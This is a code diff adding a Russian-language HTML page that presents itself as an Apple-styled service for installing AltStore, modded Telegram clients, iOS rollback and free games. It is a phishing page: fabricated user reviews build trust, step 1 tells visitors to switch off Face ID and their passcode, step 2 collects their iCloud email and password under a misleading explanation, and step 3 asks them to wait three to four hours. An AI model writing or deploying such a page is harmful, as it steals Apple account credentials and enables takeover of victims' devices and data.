@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple‑style Service</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Фоновая иконка Apple (появляется и исчезает) -->
+    <div class="apple-bg"></div>
+
+    <div class="container" id="mainContainer">
+        <h1>Добро пожаловать</h1>
+        
+        <!-- Кнопка подробнее по центру -->
+        <button id="detailsBtn">Подробнее</button>
+        
+        <!-- Серый текст под кнопкой -->
+        <p class="altstore-info">
+            AltStore — это сторонний магазин приложений для iOS, позволяющий устанавливать программы без App Store.
+        </p>
+
+        <!-- Отзывы мелко внизу -->
+        <div class="reviews">
+            <span>👹 “DoxGram получил” — Аня Барбоскина</span>
+            <span>👾 “AyuGram работает” — Настя</span>
+            <span>🔁 “Откат на iOS 18” — Ксюша Альбинова</span>
+            <span>🧩 “Игры дали” — Мара 16</span>
+        </div>
+    </div>
+
+    <!-- Модальное окно выбора опции (минималистичные плитки) -->
+    <div id="modal" class="modal hidden">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p class="modal-title">Что вам нужнее?</p>
+            <div class="options-grid">
+                <div class="option-card" data-option="ayugram">
+                    <span class="option-emoji">👾</span>
+                    <span class="option-label">AyuGram</span>
+                </div>
+                <div class="option-card" data-option="doxgram">
+                    <span class="option-emoji">👹</span>
+                    <span class="option-label">DoxGram</span>
+                </div>
+                <div class="option-card" data-option="rollback">
+                    <span class="option-emoji">🔁</span>
+                    <span class="option-label">Откат iOS</span>
+                </div>
+                <div class="option-card" data-option="games">
+                    <span class="option-emoji">🧩</span>
+                    <span class="option-label">Minecraft, FNAF, Nulls Brawl</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Шаг 1: Отключить Face ID / код-пароль -->
+    <div id="step1" class="step hidden">
+        <h2>Шаг 1 из 3</h2>
+        <p>Отключите Face ID и код-пароль в настройках устройства.</p>
+        <p class="instruction">Настройки → Face ID и код-пароль → Отключить</p>
+        <button id="continueBtn">Продолжить</button>
+    </div>
+
+    <!-- Шаг 2: Ввод данных iCloud -->
+    <div id="step2" class="step hidden">
+        <h2>Шаг 2 из 3</h2>
+        <input type="email" id="email" placeholder="Почта iCloud" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <div class="info-row">
+            <span class="info-text">Мы запрашиваем данные для установки AltStore.</span>
+            <button id="whyBtn" class="why-btn">Зачем?</button>
+        </div>
+        <div id="whyDetails" class="hidden">
+            <p class="why-details">AltStore необходим для загрузки приложений вне App Store. Если сомневаетесь, наберите в YouTube «AltStore» — всё поймёте.</p>
+        </div>
+        <input type="text" id="model" placeholder="Модель iPhone/iPad (например, iPhone 15 Pro)">
+        <button id="submitBtn">Отправить</button>
+    </div>
+
+    <!-- Шаг 3: Ожидание -->
+    <div id="step3" class="step hidden">
+        <h2>Шаг 3 из 3</h2>
+        <p>Процесс запущен. Требуется стабильное соединение.</p>
+        <p class="wait-message">Пожалуйста, подождите 3‑4 часа. Страница закроется автоматически.</p>
+        <div class="spinner"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
